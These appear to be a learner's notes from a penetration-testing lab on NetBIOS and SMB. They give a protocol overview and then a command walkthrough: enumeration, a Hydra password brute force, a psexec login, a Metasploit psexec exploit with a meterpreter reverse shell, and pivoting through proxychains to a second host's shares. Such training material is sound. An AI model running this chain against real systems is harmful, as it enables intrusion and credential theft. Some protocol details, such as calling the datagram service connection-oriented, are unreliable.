SMB and NetBIOS enumeration
- NetBIOS and SMB are two different technologies,but they are related in the context of networking and file sharing on windows networks.
- Let's break down each of them to understand their roles and how they differ.
#### NetBIOS (Network basic Input/Output System )
- NetBIOS is an API and a set of network protocols for providing communication services over a local network.It's used primarily to allow applications on different computers to find and interact with each other on a network.
- Functions:NetBIOS offer three primary services:
- Name Services (NetBIOS-NS):Allow computers to register.unregister and resolve names in a local network.
- Datagram Service (NetBIOS-DGM):Supports connection-oriented communications for more reliable data transfers.
- Sessions Service (NetBIOS-SSN):Supports connection-oriented communications for more reliable data transfers.
- Ports:NetBIOS typically uses ports 137(Name Service),138(Datagram Service),and 139(Sessions Service) over UDP and TCP.
#### SMB (Server Message Block)
- SMB is a network file sharing protocol that allows computers on a network to share files,printers and other resources .It is the primary portocol used in Windows networks for these purposes.
- Functions:SMB provides features for file and printers sharing,names pipes and inter-process communication(IPS).It allows users to access files on remote computers as i fthey were loccal.
- Versions:SMB has several versions:
  + SMB 1.0: The original version,which had security vulnerabilities.It was used with older operating systems like Windows xp.
  + SMB 2.0/2.1: Introduced with Windows vista/windows server 2008,offering improved performance and security.
  + SMB 3.0+:Introduced with  windows 8/Windows server 2012,adding features like encryption,multicahnnel supports,and improvements for virtualization
- Ports:SMB  generally uses port 445 for direct SMB traffic( bypassing NetBIOS) port 139 when operating with netbios.

### lab
#### netbios
- nmap demo.ine.local
- nbtscan [kali linux tool ]
- nbtscan 10.10.4.0/24 [ scan whole LAN and find windows hosts ]
- nmblookup -A 10.4.30.139 [ nmblookup is a kali linux tool]
- nmap -sU -sV -T4 --script nbstat.nse -p137 -Pn 10.4.30.139 []
#### smb
- nmap -sV -p 139,445 demo.ine.local [ basic port scan ]
- nmap -p445 --script smb-protocols demo.ine.local [ smb versions ]
-  nmap -p445 --script smb-security-mode demo.ine.local [ smb security level ]
- smbclient -L demo.ine.local [ annoymous access ]
- nmap -p445 --script smb-enum-users.nse 10.4.30.139 [ user enumeration ]
- hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb [ use the user name found in the previous command  as users.txt ]
- psexec.py administrator@demo.ine.local [ use the previously found credentials like administrator to login ]
- msfconsole -q 
- search psexec
- use exploit/windows/smb/psexec
- set everything requires
- set payload windows/x64/meterpreter/reverse_tcp  
- run
- this give a meterpreter sessions
##### Pivoting
- As we access the first machine now from the first machine meterpreter shell
- shell
- ping 10.4.26.4 [ ping the 2nd machine from first machine ]
- run autoroute -s 10.4.26.0/20 [ add the route via the first compromise machine to 2nd machine ]
- ctrl + z [ background the meterpreter shell ]
- search socks [ find socks module ]
- use auxiliary/server/socks_proxy 
- set VERSION 4a
- set SRVPORT 9050 [cat /etc/proxychains4.conf this will show the srvport,in this case 9050 ,use this cat command in new tab]
- run [ the session will run in background ]
- netstate -antp [ run this command in new to list the running process with port,we find 9050 port is running ]
- proxychains nmap demo1.ine.local -sT -sV -p 445  [ now we can reach demo1.ine.local as we set proxy chain previous commands and this command give basic info of demo1.ine.local ]
- sessions 2 [now back to meterpreter sessions ]

- shell 
- net view 10.4.26.4 [ this show access denied ]
- ctrl + c 
- migrate -N explorer.exe
- shell 
- net view 10.4.26.4 [ this will show all the share names ]
- net use D: \\10.4.26.4\Documents [It will connect the shared folder Documents on the remote host 10.4.26.4 and assign it to drive letter D: on your local machine.]
- net use K: \\10.4.26.4\k$ [$ symbol means adminitrative hidden ]
- dir K: [ then we access it as normal drive or files ]
#### Tools:
- nbtscan
- nmblookup
- smbclient
- proxychians
#### Resource
- https://medium.com/@sam_sepiol_/pivoting-deep-into-networks-proxychains-and-metasploit-autoroute-in-action-56339d66e466

